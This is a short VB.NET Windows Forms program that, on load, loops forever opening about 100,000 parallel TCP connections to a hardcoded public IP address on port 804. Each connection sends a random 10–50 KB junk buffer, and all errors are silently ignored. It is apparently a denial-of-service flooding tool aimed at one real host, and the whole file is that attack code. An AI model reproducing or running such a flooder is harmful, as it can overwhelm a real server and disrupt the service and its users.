
Imports System.Threading.Tasks

Public Class Form1
    Private l As New System.Collections.Concurrent.ConcurrentBag(Of Communication.CommPort.eTcpClient)

    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

        System.Threading.ThreadPool.QueueUserWorkItem(Sub()
                                                          While True
                                                              Try
                                                                  Dim rd As New Random
                                                                  Parallel.For(1, 100 * 1000, Sub(index)
                                                                                                  Dim tmp As New Communication.CommPort.eTcpClient("223.86.105.239", 804)
                                                                                                  tmp.Connect()
                                                                                                  Dim d As Byte()
                                                                                                  ReDim d(rd.Next(10000, 50000))
                                                                                                  tmp.Send(d)
                                                                                                  tmp.DisConnect()
                                                                                                  tmp.Dispose()
                                                                                              End Sub)
                                                              Catch ex As Exception

                                                              End Try

                                                          End While
                                                      End Sub)
   
    End Sub


End Class
